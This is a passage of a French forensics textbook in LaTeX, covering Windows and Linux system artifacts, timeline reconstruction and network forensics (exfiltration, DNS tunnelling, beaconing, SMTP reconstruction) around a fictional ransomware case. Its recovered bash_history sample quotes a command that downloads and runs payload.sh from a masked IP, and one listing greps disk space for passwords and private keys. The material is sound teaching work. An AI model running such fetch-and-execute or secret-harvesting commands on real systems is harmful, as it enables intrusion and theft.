    \textbf{Souvent désactivé} depuis Windows~Vista
    (\texttt{NtfsDisableLastAccessUpdate=1})~; ne pas s'y fier
    sans vérification \\
\textbf{C} --- Changed (MFT) & Dernière modification de
    l'\emph{entrée MFT} elle-même (métadonnées, permissions) &
    Différent de Modified~! Un renommage modifie C sans modifier M \\
\textbf{E} --- Entry created/Birth & Création de l'entrée MFT &
    Peut différer de la date de création réelle du fichier
    si copié depuis un autre volume \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.3 --- Les quatre horodatages MACE de NTFS}\end{center}

\begin{boxalert}
\textbf{``Timestomping''~: la manipulation des horodatages}

Des outils comme \texttt{timestomp} permettent à un attaquant de
modifier artificiellement les 4~horodatages MACE d'un fichier pour
le faire ``apparaître'' plus ancien et échapper à la timeline.

\textbf{Détection~:} le \texttt{\$UsnJrnl} (section suivante) et le
\texttt{\$LogFile} (journal de transactions NTFS) enregistrent les
\emph{changements} d'horodatages indépendamment des valeurs MACE
elles-mêmes. Une entrée \texttt{\$MFT} affichant une date de création
``2020'' alors que le \texttt{\$UsnJrnl} montre une création le
``13/03/2026'' révèle un timestomping. \textbf{Toujours croiser
\$MFT et \$UsnJrnl pour les fichiers suspects.}
\end{boxalert}

\subsection{Le journal USN~: l'historique immuable des changements}

Le \termecle{\$UsnJrnl}\index{\$UsnJrnl} (\textit{Update Sequence Number
Journal}) enregistre chronologiquement chaque opération sur le système
de fichiers~: création, suppression, renommage, modification.
Contrairement à la \texttt{\$MFT} qui ne montre que l'\emph{état actuel},
le \texttt{\$UsnJrnl} montre l'\emph{historique}.

\begin{boxoutils}{Extraction du \$UsnJrnl avec MFTECmd}
\begin{lstlisting}[language=bash_forensique]
# Extraction et parsing du journal USN
MFTECmd.exe -f /mnt/evidence/\$Extend/\$UsnJrnl:\$J --csv ./output/

# Resultat (extrait, chronologique) :
# Timestamp            Filename              Reason
# 2026-03-13 02:16:50  enc_all.ps1           FileCreate
# 2026-03-13 02:17:44  enc_all.ps1           DataExtend|Close
# 2026-03-13 02:18:30  enc_all.ps1           FileDelete
# 2026-03-13 02:18:31  encrypted_files_list.txt  FileCreate
# 2026-03-13 02:18:31  *.docx (x847)         DataOverwrite (chiffrement)
\end{lstlisting}
\textbf{Constatation~:} le \texttt{\$UsnJrnl} révèle la séquence
exacte~: création du script (02h16:50)~$\to$ exécution (02h17:44, cohérent
avec Prefetch/UserAssist)~$\to$ suppression du script (02h18:30, tentative
d'anti-forensique)~$\to$ chiffrement de masse (02h18:31, 847~fichiers).
\textbf{La suppression du script à 02h18:30 n'a effacé ni le Prefetch,
ni UserAssist, ni le \$UsnJrnl lui-même.}
\end{boxoutils}

% ============================================================================
\section{Artefacts Linux~: journald, bash et ext4}
\label{sec:artefacts-linux}
% ============================================================================

\subsection{Le journal systemd}

Sur les systèmes Linux modernes (Ubuntu~20.04+, Debian~11+, RHEL~8+),
\termecle{journald}\index{journald} centralise les logs système dans
un format binaire indexé.

\begin{boxoutils}{Analyse forensique de journald}
\begin{lstlisting}[language=bash_forensique]
# Analyser les journaux d'une image montee (hors-ligne)
journalctl --root=/mnt/evidence --since "2026-03-13 02:00:00" \
    --until "2026-03-13 03:00:00"

# Filtrer par service (ex : SSH)
journalctl --root=/mnt/evidence -u ssh.service

# Connexions SSH reussies / echouees
journalctl --root=/mnt/evidence | grep -i "sshd.*Accepted\|sshd.*Failed"
# Resultat type :
# Mar 13 02:14:02 srv sshd[4821]: Failed password for root from
#     185.220.XX.XX port 51234 ssh2
# Mar 13 02:14:09 srv sshd[4821]: Accepted password for root from
#     185.220.XX.XX port 51234 ssh2
# -> 7 tentatives echouees puis succes : brute-force reussi

# Commandes sudo executees
journalctl --root=/mnt/evidence | grep "sudo:.*COMMAND"
\end{lstlisting}
\end{boxoutils}

\subsection{Historique bash et fichiers de configuration shell}

\begin{boxoutils}{Artefacts shell -- bash\_history et environnement}
\begin{lstlisting}[language=bash_forensique]
# Historique des commandes (attention : tronque a HISTSIZE)
cat /mnt/evidence/root/.bash_history
cat /mnt/evidence/home/*/.bash_history

# Timestamps si HISTTIMEFORMAT etait active :
# #1678672664
# wget http://185.220.XX.XX/payload.sh
# #1678672680
# chmod +x payload.sh && ./payload.sh

# Fichiers de configuration modifies recemment (persistance)
find /mnt/evidence/etc -name "*.service" -newer \
    /mnt/evidence/etc/hostname

# Crontabs -- mecanisme de persistance frequent
cat /mnt/evidence/etc/crontab
cat /mnt/evidence/var/spool/cron/crontabs/*
ls -la /mnt/evidence/etc/cron.d/

# Cles SSH autorisees (backdoor frequente)
cat /mnt/evidence/root/.ssh/authorized_keys
cat /mnt/evidence/home/*/.ssh/authorized_keys
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{bash\_history~: une preuve fragile}
Le fichier \texttt{.bash\_history} n'est écrit sur disque qu'à la
fermeture propre du shell (\texttt{exit}, ou périodiquement). Un
attaquant qui tue brutalement sa session (\texttt{kill~-9}) ou
définit \texttt{HISTSIZE=0} laisse un historique vide ou incomplet.
\textbf{Ne jamais conclure ``aucune commande exécutée'' sur la seule
absence d'historique~: croiser avec \texttt{journald},
\texttt{auditd} (si actif), et l'analyse mémoire (Volatility~3,
\texttt{linux.bash} --- récupère l'historique depuis la mémoire
même non écrit sur disque).}
\end{boiteRemarque}

\subsection{Structures ext4~: inodes et récupération}

Le système de fichiers \termecle{ext4}\index{ext4} organise chaque
fichier autour d'un \textit{inode} contenant ses métadonnées
(taille, permissions, horodatages, pointeurs vers les blocs de données).
La suppression d'un fichier sous ext4 libère l'inode et marque les blocs
comme disponibles, \textbf{sans effacer immédiatement le contenu}.

\begin{boxoutils}{Récupération de fichiers supprimés ext4 avec extundelete}
\begin{lstlisting}[language=bash_forensique]
# Lister les inodes recemment supprimes
extundelete /mnt/evidence/dev/sdb1 --inode 2

# Recuperer tous les fichiers supprimes recuperables
extundelete /mnt/evidence/dev/sdb1 --restore-all \
    -o /output/recovered/

# Alternative : debugfs pour inspection manuelle d'un inode
debugfs -R "stat <12345>" /mnt/evidence/dev/sdb1
# Affiche : Inode, Mode, taille, Links, horodatages, blocs

# Recherche de chaines dans l'espace libre (complement carving Ch. 9)
dd if=/mnt/evidence/dev/sdb1 bs=4096 skip=0 | \
    strings -n 8 | grep -i "password\|api_key\|BEGIN PRIVATE KEY"
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Reconstruction de Timeline Forensique}
\label{sec:timeline}
% ============================================================================

\subsection{Pourquoi une timeline unifiée}

Chaque source d'artefacts (registre, \texttt{\$MFT}, \texttt{\$UsnJrnl},
journald, logs applicatifs) produit ses propres horodatages dans des
formats différents. La \termecle{timeline forensique}\index{timeline
forensique} unifie ces sources en une chronologie unique, permettant
de \textbf{voir la séquence complète des événements} et d'identifier
les corrélations qu'aucune source isolée ne révèle.

\subsection{log2timeline / plaso}

\begin{boxoutils}{Construction d'une timeline avec log2timeline (plaso)}
\begin{lstlisting}[language=bash_forensique]
# Generer le fichier plaso (extraction brute, multi-sources)
log2timeline.py /output/timeline.plaso /mnt/evidence/

# Filtrer et exporter en CSV pour la periode d'interet
psort.py -o l2tcsv -w /output/timeline.csv /output/timeline.plaso \
    "date > '2026-03-13 02:00:00' AND date < '2026-03-13 03:00:00'"

# Exemple de timeline consolidee (extrait, toutes sources) :
# 02:14:02  journald     SSH Failed password from 185.220.XX.XX
# 02:14:09  journald     SSH Accepted password (root)
# 02:16:50  $UsnJrnl     FileCreate enc_all.ps1
# 02:17:40  UserAssist   powershell.exe executed
# 02:17:42  UserAssist   cmd.exe executed
# 02:17:44  Prefetch     enc_all.ps1 executed (RunCount=1)
# 02:17:44  $UsnJrnl     enc_all.ps1 DataExtend|Close
# 02:18:30  $UsnJrnl     enc_all.ps1 FileDelete
# 02:18:31  $UsnJrnl     encrypted_files_list.txt FileCreate
# 02:18:31  $UsnJrnl     *.docx (x847) DataOverwrite
\end{lstlisting}
\end{boxoutils}

\subsection{Lecture d'une timeline~: constatation vs interprétation}

\begin{boxscenario}{Timeline MVOM -- rédaction du rapport}
À partir de la timeline consolidée ci-dessus, voici comment rédiger
les sections \textbf{Constatations} et \textbf{Analyse} (NIST~SP~800-86,
Ch.~\ref{chap:meth-std})~:

\textbf{Constatations (faits vérifiables, non ambigus)~:}
\begin{quote}
``Le journal \texttt{journald} enregistre 7~tentatives de connexion
SSH échouées depuis l'IP \texttt{185.220.XX.XX} entre 02h13:45 et
02h14:08, suivies d'une connexion réussie au compte \texttt{root}
à 02h14:09. Le \texttt{\$UsnJrnl} enregistre la création du fichier
\texttt{enc\_all.ps1} à 02h16:50. UserAssist et Prefetch enregistrent
l'exécution de \texttt{powershell.exe}, \texttt{cmd.exe} et
\texttt{enc\_all.ps1} entre 02h17:40 et 02h17:44. Le \texttt{\$UsnJrnl}
enregistre la suppression de \texttt{enc\_all.ps1} à 02h18:30, suivie
à 02h18:31 de la création de \texttt{encrypted\_files\_list.txt} et
de la modification de 847~fichiers \texttt{.docx}.''
\end{quote}

\textbf{Analyse (interprétation, avec niveau de confiance)~:}
\begin{quote}
``La séquence temporelle ci-dessus est cohérente, \emph{avec un niveau
de confiance élevé}, avec le scénario suivant~: un accès SSH non
autorisé au compte \texttt{root} a été obtenu par force brute
(02h14)~; environ 2~minutes et 40~secondes plus tard, un script
ransomware a été déposé et exécuté (02h16--02h18)~; ce script a
chiffré 847~fichiers avant de tenter de s'auto-supprimer
(02h18:30), une technique d'anti-forensique courante qui a
échoué à effacer les traces dans le \texttt{\$UsnJrnl}, le
Prefetch et UserAssist.''
\end{quote}
\end{boxscenario}

% ============================================================================
\section{Synthèse~: Méthodologie d'Analyse Système}
\label{sec:synthese-for-sys}
% ============================================================================

\begin{tableaucours}{p{3.5cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Question} &
    \tableauHeader{Sources Windows} &
    \tableauHeader{Sources Linux}
}
Quel programme a été exécuté, quand~? &
    Prefetch, UserAssist, ShimCache, Amcache &
    \texttt{bash\_history}, \texttt{auditd},
    \texttt{journald} (systemd-coredump) \\
Quel fichier a été créé/modifié/supprimé, quand~? &
    \texttt{\$UsnJrnl}, \texttt{\$MFT} (MACE) &
    \texttt{debugfs}, \texttt{extundelete},
    horodatages inode \\
Un périphérique externe a-t-il été connecté~? &
    \texttt{USBSTOR} (registre SYSTEM), Event~ID~2003/2100 &
    \texttt{journald} (kernel~: \texttt{usb~new device}),
    \texttt{/var/log/syslog} \\
Une connexion réseau a-t-elle été établie~? &
    Volatility \texttt{netscan} (Ch.~\ref{chap:acq}), pare-feu &
    \texttt{journald} (sshd, NetworkManager), \texttt{auditd} \\
Les horodatages ont-ils été manipulés~? &
    Croiser \texttt{\$MFT} (MACE) et \texttt{\$UsnJrnl} &
    Croiser \texttt{stat} inode et \texttt{journald} \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.4 --- Méthodologie d'analyse système~:
question $\to$ sources}\end{center}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Redondance forensique}~: une action système laisse
          de multiples traces indépendantes. Toujours chercher la
          convergence entre plusieurs sources avant de conclure.

    \item \textbf{Windows~: cinq artefacts à toujours vérifier}~:
          Prefetch (preuve d'exécution), UserAssist (historique GUI),
          ShimCache/Amcache (inventaire d'exécution avec hash),
          \texttt{\$UsnJrnl} (historique des changements de fichiers).

    \item \textbf{MACE et timestomping}~: les 4~horodatages NTFS
          (Modified, Accessed, Changed, Entry-created) peuvent être
          manipulés. Le \texttt{\$UsnJrnl} et le \texttt{\$LogFile}
          révèlent les manipulations car ils enregistrent
          l'\emph{historique}, pas seulement l'\emph{état}.

    \item \textbf{Linux~: \texttt{journald} + \texttt{bash\_history}
          + crontabs + \texttt{authorized\_keys}}~: les quatre premiers
          endroits à vérifier. \texttt{bash\_history} est fragile~:
          croiser avec Volatility \texttt{linux.bash} pour l'historique
          non écrit sur disque.

    \item \textbf{ext4}~: la suppression libère l'inode sans effacer
          immédiatement les données~; \texttt{extundelete} et
          \texttt{debugfs} permettent la récupération.

    \item \textbf{Timeline unifiée (log2timeline/plaso)}~: consolide
          toutes les sources en une chronologie. La rédaction du
          rapport sépare strictement \textbf{constatations}
          (faits horodatés, vérifiables) et \textbf{analyse}
          (interprétation, avec niveau de confiance explicite ---
          NIST~SP~800-86).
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~14.1 --- Identification d'artefacts \niveaubase}]
Pour chacune des questions suivantes, identifiez l'artefact Windows
ou Linux le plus pertinent, et la commande/outil pour l'extraire~:
\begin{enumerate}[(a)]
    \item Un suspect affirme n'avoir jamais exécuté \texttt{TrueCrypt}
          sur son PC Windows~10. Comment vérifier~?
    \item Une clé USB a-t-elle été branchée sur ce PC Windows dans les
          30~derniers jours, et si oui, laquelle (numéro de série)~?
    \item Sur un serveur Linux, un fichier \texttt{/etc/shadow} a été
          modifié il y a 2~jours. Comment savoir qui l'a modifié et quand,
          précisément~?
    \item Un fichier \texttt{rapport\_confidentiel.docx} a été supprimé
          d'un disque ext4 il y a 1~heure. Quelles sont les chances de
          récupération et quel outil utiliser~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~14.2 --- Détection de timestomping \niveaumoyen}]
L'analyse \texttt{\$MFT} d'un fichier \texttt{rootkit.dll} montre~:
\begin{lstlisting}[language=bash_forensique]
Created (E):   2019-08-12 14:30:00
Modified (M):  2019-08-12 14:30:00
Accessed (A):  2019-08-12 14:30:00
Changed (C):   2019-08-12 14:30:00
\end{lstlisting}
L'analyse \texttt{\$UsnJrnl} pour le même fichier montre~:
\begin{lstlisting}[language=bash_forensique]
2026-03-13 02:19:15  rootkit.dll  FileCreate
2026-03-13 02:19:16  rootkit.dll  DataExtend|Close
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Que révèle cette divergence~?
    \item Rédigez la constatation (sans interprétation) et l'analyse
          (avec interprétation et niveau de confiance) correspondantes,
          en respectant la distinction NIST~SP~800-86.
    \item Quels autres artefacts (Prefetch, UserAssist, ShimCache)
          permettraient de confirmer l'horodatage réel d'exécution~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~14.3 --- Timeline complète \niveauexpert}]
Vous disposez d'une image E01 d'un serveur Windows~Server~2022
(Opération MVOM) et d'un dump RAM associé. Le service IT signale
que le ransomware a chiffré les fichiers entre 02h15 et 02h20
le 13~mars~2026, mais ne sait pas comment l'attaquant a obtenu
l'accès initial.

\begin{enumerate}[(a)]
    \item Construisez le plan d'investigation~: dans quel ordre
          analyser quelles sources (registre, \texttt{\$MFT},
          \texttt{\$UsnJrnl}, journal des événements, RAM)~? Justifiez
          l'ordre.
    \item Pour chaque source analysée, quelle question spécifique
          cherchez-vous à répondre~?
    \item Construisez (sur la base des éléments fournis dans ce
          chapitre et au Chapitre~\ref{chap:acq}) la timeline complète
          de l'incident, de l'accès initial au chiffrement.
    \item Rédigez les sections Constatations et Analyse de votre
          rapport~: au moins 5~constatations horodatées et une
          analyse globale avec niveau de confiance explicite.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:for-net} (Forensique Réseau
Opérationnelle) complète ce chapitre en se concentrant sur les artefacts
\emph{réseau}~: capture et analyse approfondie de trafic, détection
d'exfiltration de données, analyse de protocoles chiffrés. Le
Chapitre~\ref{chap:anti-for} (Anti-Forensique et Contre-Mesures)
traite ensuite des techniques que les attaquants utilisent pour
échapper exactement aux analyses présentées dans ce chapitre~--- et
comment les détecter malgré tout.
\end{boxinfo}

      
        % ============================================================================
% Fichier  : partie4/P04_C15_forensique_reseau.tex
% Titre    : Forensique Réseau Opérationnelle
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Ch. 9 (Wireshark -- bases), Ch. 14 (redondance forensique),
%            M5_Investigation_Numerique_PNC.docx (BLOC 4 réseau),
%            affaires WOURI (BEC), BAOBAB (MoMo transfrontalier)
% Positionnement : Ch. 9 a posé les bases Wireshark (filtres de base, cas
%                  WOURI). Ce chapitre approfondit : capture positionnée,
%                  protocoles chiffrés, exfiltration DNS, analyse de logs
%                  pare-feu/proxy, corrélation multi-sources.
% ============================================================================

\chapter{Forensique Réseau Opérationnelle}
\label{chap:for-res}

\epigraph{%
    « Le réseau ne ment jamais. Il ne se souvient pas de tout,
    mais ce dont il se souvient est vrai. »%
}{--- Principe de la forensique réseau}

\niveauChapitre{Expert}{%
    Maîtrise du Chapitre~\ref{chap:acq} (Wireshark bases)
    et du Chapitre~\ref{chap:for-sys} (timeline, redondance)
    indispensable. Protocoles TCP/IP, DNS, HTTP/S requis.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Positionner une sonde de capture dans différentes topologies
          réseau et comprendre ce que chaque position capture (et rate).
    \item Analyser en profondeur une capture \texttt{.pcap}~:
          flux TCP, indicateurs d'exfiltration, tunnels DNS,
          beaconing de malware.
    \item Reconstruire des sessions applicatives depuis une capture~:
          emails SMTP, transferts HTTP, commandes FTP.
    \item Analyser des logs de pare-feu, proxy et DNS pour reconstituer
          l'activité réseau en l'absence de capture complète.
    \item Identifier les marqueurs de communications C2
          (\textit{Command and Control}) dans le trafic chiffré.
    \item Appliquer la corrélation temporelle multi-sources~:
          capture réseau + logs système + timeline (Ch.~\ref{chap:for-sys}).
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Positionnement dans le cours}
% ============================================================================

Le Chapitre~\ref{chap:acq} a introduit Wireshark avec ses filtres
de base et le cas WOURI. Ce chapitre va plus loin~: comment capturer
intelligemment dans un réseau réel, comment analyser le trafic chiffré,
comment détecter l'exfiltration de données, et comment reconstituer
l'activité réseau quand on n'a pas de capture (mais des logs).

\separateur

% ============================================================================
\section{Positionnement de la Sonde~: ce qu'on Voit et ce qu'on Rate}
\label{sec:positionnement-sonde}
% ============================================================================

\subsection{Topologies et points de capture}

La valeur d'une capture réseau dépend \emph{entièrement} de la position
de la sonde dans le réseau. Capturer au mauvais endroit, c'est ne rien voir.

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Position} &
    \tableauHeader{Ce qu'on capture} &
    \tableauHeader{Ce qu'on rate}
}
\textbf{Port SPAN / Mirror} sur le switch principal &
    Tout le trafic qui traverse le switch (nord-sud ET est-ouest) &
    Trafic interne entre machines sur le même segment si non mirrored \\
\textbf{TAP réseau} sur le lien WAN &
    Tout le trafic entrant/sortant de l'entreprise vers Internet &
    Trafic interne (LAN to LAN)~; communications intra-entreprise \\
\textbf{Agent hôte} (sur la machine suspecte) &
    Tout le trafic de \emph{cette} machine, même chiffré avant
    le réseau &
    Trafic des autres machines \\
\textbf{Pare-feu / proxy logs} (sans capture) &
    Connexions autorisées/refusées (IP, port, octets) &
    Contenu des connexions~; trafic qui ne passe pas par le
    proxy (UDP, ICMP) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~15.1 --- Positions de capture et couverture}\end{center}

\subsection{Capture sur un switch managé~: SPAN port}

\begin{boxoutils}{Configuration d'un SPAN port (Cisco IOS)}
\begin{lstlisting}[language=bash_forensique]
! Configuration d'une session SPAN sur Cisco IOS
! Port monitore : GigabitEthernet0/1 (machine suspecte)
! Port destination : GigabitEthernet0/24 (poste forensique)

Switch(config)# monitor session 1 source interface Gi0/1 both
Switch(config)# monitor session 1 destination interface Gi0/24

! Verifier la configuration
Switch# show monitor session 1
! Resultat :
! Session 1
! Type           : Local Session
! Source Ports   : Both : Gi0/1
! Destination Ports : Gi0/24

! Sur le poste forensique (connecte sur Gi0/24) :
tcpdump -i eth0 -w /output/capture_suspect.pcap
! Ou avec ring buffer (fichiers de 100 Mo max) :
tcpdump -i eth0 -C 100 -W 50 -w /output/capture_%Y%m%d_%H%M%S.pcap
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{Wireshark live vs tcpdump + analyse offline}
En contexte forensique, la bonne pratique est de capturer avec
\texttt{tcpdump} (léger, consomme peu de ressources) en production,
puis d'analyser avec Wireshark offline sur le \texttt{.pcap} résultant.
Lancer Wireshark avec son interface graphique directement sur une
machine en production peut introduire une charge réseau supplémentaire
et des artefacts dans la capture elle-même.
\end{boiteRemarque}

% ============================================================================
\section{Analyse Approfondie des Flux TCP}
\label{sec:analyse-flux}
% ============================================================================

\subsection{Suivre un flux complet~: Follow TCP Stream}

La fonction \textit{Follow TCP Stream} de Wireshark reconstitue la
session complète d'un échange TCP en réassemblant les segments dans
l'ordre. C'est l'outil le plus puissant pour comprendre rapidement
ce qu'une connexion a échangé.

\begin{boxoutils}{Wireshark -- Follow TCP Stream et export}
\begin{lstlisting}[language=bash_forensique]
# En ligne de commande avec tshark (equivalent Wireshark CLI)
# Extraire tous les flux TCP et les afficher
tshark -r capture.pcap -q -z "follow,tcp,ascii,0"

# Lister les conversations TCP avec volumes
tshark -r capture.pcap -q -z "conv,tcp"
# Resultat :
#                    |      <-      |      ->      |    Total
# 10.0.0.15:49212 <-> 185.220.XX.XX:4444
#                         1476       14832          16308 bytes

# Extraire les objets HTTP (fichiers telecharges)
tshark -r capture.pcap --export-objects "http,/output/http_objects/"

# Extraire les objets SMB (fichiers partages reseau)
tshark -r capture.pcap --export-objects "smb,/output/smb_objects/"
# Utile pour detecter exfiltration via partages reseau

# Calculer le hash SHA-256 de chaque objet extrait
find /output/http_objects/ -type f -exec sha256sum {} \; \
    > /output/http_objects_hashes.txt
# Puis soumettre sur VirusTotal (API ou interface web)
\end{lstlisting}
\end{boxoutils}

\subsection{Métriques d'anomalie réseau}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Métrique} &
    \tableauHeader{Valeur normale} &
    \tableauHeader{Anomalie (indicateur suspect)}
}
Durée d'une session HTTP & 0.1--2~secondes & $>$~60~secondes~:
    session persistante anormale \\
Volume de réponse HTTP & Variable & Requête~\texttt{GET /index.html}
    de 200~octets reçoit 50~Mo~: exfiltration \\
Ratio upload/download & $\ll$~1 (navigation) & Ratio proche de~1~:
    exfiltration~; ratio $\gg$~1~: upload de données \\
Intervalles de connexion & Irréguliers & Intervalles fixes (30~s,
    60~s, 300~s)~: beaconing de malware \\
Entropie du contenu & Faible (texte/HTML) & Haute (binaire, chiffré)~:
    contenu encodé ou chiffré \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~15.2 --- Métriques d'anomalie réseau}\end{center}

% ============================================================================
\section{Détection d'Exfiltration de Données}
\label{sec:exfiltration}
% ============================================================================

\subsection{Exfiltration HTTP/HTTPS~: le vecteur le plus courant}

\begin{boxoutils}{Détecter une exfiltration HTTP depuis une capture}
\begin{lstlisting}[language=bash_forensique]
# Requetes POST avec corps volumineux (upload de donnees)
tshark -r capture.pcap -Y "http.request.method == POST" \
    -T fields -e frame.time -e ip.src -e ip.dst \
    -e http.host -e http.content_length

# Resultat suspect :
# 2026-03-13 02:19:05  10.0.0.15  185.220.XX.XX
#   update.windowscdn.net  content_length: 45231400
# -> 45 Mo envoyes vers un domaine qui semble legitime
#    mais est enregistre il y a 2 jours (CDN de facade)

# Calculer le volume par destination (top exfiltration targets)
tshark -r capture.pcap -q -z "ip_hosts,tree"
# Alternatif : Statistics --> IP Addresses dans Wireshark GUI

# Detecter contenu base64 dans les parametres URL
tshark -r capture.pcap -Y "http" \
    -T fields -e http.request.uri | \
    grep -oE "[A-Za-z0-9+/]{30,}={0,2}"
# Base64 de 30+ caracteres dans les URLs = encodage de donnees voles
\end{lstlisting}
\end{boxoutils}

\subsection{Tunneling DNS~: exfiltration via le port~53}

Le \termecle{tunneling DNS}\index{tunneling DNS} exploite le protocole
DNS pour exfiltrer des données ou établir un canal C2 (Command \& Control).
Son avantage~: le port~53 UDP est ouvert sur presque tous les pare-feu.

\begin{boxoutils}{Détecter le tunneling DNS}
\begin{lstlisting}[language=bash_forensique]
# Statistiques des requetes DNS par domaine (top queried)
tshark -r capture.pcap -Y "dns.qry.type == A" \
    -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20

# Indicateurs de tunneling DNS :
# 1. Sous-domaines tres longs (encodage base32/64 dans le label)
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | \
    awk 'length($0) > 50'
# Resultat suspect :
# aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.malware.domain.com
# -> sous-domaine de 60 caracteres = payload encode

# 2. Volume de requetes DNS anormalement eleve pour un meme domaine
tshark -r capture.pcap -Y "dns.qry.name contains malware.domain.com" \
    -T fields -e frame.time -e dns.qry.name | wc -l
# 847 requetes en 10 minutes vers le meme domaine = tunnel

# 3. Reponses DNS TXT avec contenu inhabituel (canal C2 entrant)
tshark -r capture.pcap -Y "dns.resp.type == 16" \
    -T fields -e dns.txt
# Si les TXT ressemblent a du binaire encode : C2 via DNS TXT

# Outil specialise : dnscat2-detector ou dnstap-analysis
# Pour la forensique offline : analyser les logs du resolver DNS
\end{lstlisting}
\end{boxoutils}

\begin{boxCRO}
\textbf{Analyse CRO --- Tunneling DNS et détection}

$\mathcal{C}$ (Confidentialité pour l'attaquant)~: le tunnel DNS chiffre
généralement son contenu~; même si le tunnel est détecté, le contenu
exfiltré peut être inaccessible sans la clé de déchiffrement.

$\mathcal{R}$ (Fiabilité de la détection)~: les indicateurs
statistiques (longueur de requête, volume, TXT records) sont des
\emph{indicateurs} de tunneling, pas des preuves directes. Un domaine
CDN légitime peut générer des sous-domaines longs. Documenter la
convergence de plusieurs indicateurs.

$\mathcal{O}$ (Opposabilité)~: la capture pcap avec les requêtes DNS
anormales constitue une preuve directe de l'activité réseau, admissible
selon les mêmes principes que tout autre artefact réseau.

\cro{$\downarrow$ contenu inaccessible}{$\uparrow$ convergence indicateurs}{$\uparrow\uparrow$ capture pcap directe}
\end{boxCRO}

\subsection{Beaconing~: détecter un implant actif}

Le \termecle{beaconing}\index{beaconing} est le comportement caractéristique
d'un malware qui contacte périodiquement son serveur C2 pour recevoir
des instructions. La signature~: des connexions à intervalles
réguliers vers la même destination.

\begin{lstlisting}[language=bash_forensique,
    caption={Détection de beaconing dans une capture}]
# Extraire les timestamps de connexions vers une IP suspecte
tshark -r capture.pcap \
    -Y "ip.dst == 185.220.XX.XX && tcp.flags.syn == 1" \
    -T fields -e frame.time_epoch | sort -n > /tmp/beacon_times.txt

# Calculer les intervalles entre connexions (en secondes)
awk 'NR>1{printf "%.0f\n", $1-prev} {prev=$1}' \
    /tmp/beacon_times.txt | sort | uniq -c | sort -rn

# Resultat type (beaconing sur 300 secondes) :
#   47 300    <- 47 intervalles de exactement 300 secondes
#    2 299
#    1 301
# -> malware avec beacon toutes les 5 minutes, jitter +/- 1s
# Comparaison : trafic normal -> distribution aleatoire des intervalles
\end{lstlisting}

% ============================================================================
\section{Reconstruction de Sessions Applicatives}
\label{sec:reconstruction-sessions}
% ============================================================================

\subsection{Reconstituer un email SMTP}

\begin{boxoutils}{Extraction et reconstruction d'email SMTP}
\begin{lstlisting}[language=bash_forensique]
# Extraire le contenu SMTP brut
tshark -r capture.pcap -Y "smtp" \
    -T fields -e smtp.req.command -e smtp.req.parameter

# Follow TCP Stream sur une session SMTP (non chiffree)
tshark -r capture.pcap -q -z "follow,tcp,ascii,5"
# Resultat type :
# EHLO attacker.ru
# MAIL FROM:<contact@medequip-portugal.com>
# RCPT TO:<finance@sotradi.cm>
# DATA
# From: Service Comptabilite <contact@medequip-portugal.com>
# Subject: Facture mensuelle equipements
# [corps du message avec piece jointe frauduleuse]

# Extraire les pieces jointes SMTP (format MIME)
# Wireshark GUI : File --> Export Objects --> IMF (Internet Mail)
# CLI :
tshark -r capture.pcap --export-objects "imf,/output/smtp_objects/"
# Puis analyser la piece jointe :
file /output/smtp_objects/attachment.pdf
sha256sum /output/smtp_objects/attachment.pdf
# Verifier sur VirusTotal
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Cas WOURI --- Reconstruction complète de l'email BEC}
La capture réseau de SOTRADI~SA (\texttt{sotradi\_capture.pcap})
contient la session SMTP du phishing. Analyse~:

\textbf{Étape~1 --- Identifier la session SMTP suspecte~:}
\begin{lstlisting}[language=bash_forensique]
# Filtrer les sessions SMTP entrantes (serveur mail SOTRADI sur TCP 25)
tshark -r sotradi_capture.pcap -Y "smtp && tcp.dstport == 25"
# Session identifiee : frame 14872-14950, IP source 91.XXX.XX.XX
\end{lstlisting}

\textbf{Étape~2 --- Analyser les en-têtes SMTP~:}
\begin{lstlisting}[language=bash_forensique]
tshark -r sotradi_capture.pcap -q -z "follow,tcp,ascii,14872"
# En-tetes reveles :
# MAIL FROM: contact@medequip-portugal.com
# X-Originating-IP: 91.XXX.XX.XX    <- IP reelle (serveur russe)
# Received: from mail.yandex.ru      <- origine reelle
# Date: 2026-01-15 14:28:03
\end{lstlisting}

\textbf{Constatation forensique~:}
L'email de la session TCP~5 (frame~14872) affiche l'adresse expéditrice
\texttt{contact@medequip-portugal.com} dans le champ \texttt{MAIL FROM}
mais révèle dans le champ \texttt{X-Originating-IP} l'IP
\texttt{91.XXX.XX.XX}, enregistrée en Russie selon les bases WHOIS
consultées le 20~janvier~2026. L'en-tête \texttt{Received} confirme
le transit par les serveurs Yandex.ru.
\end{boxscenario}

\subsection{Analyse de trafic FTP~: transferts de fichiers en clair}

\begin{lstlisting}[language=bash_forensique,
    caption={Reconstruction de transferts FTP depuis une capture}]
# FTP en clair (port 21 controle, 20 donnees) : tout visible
tshark -r capture.pcap -Y "ftp" \
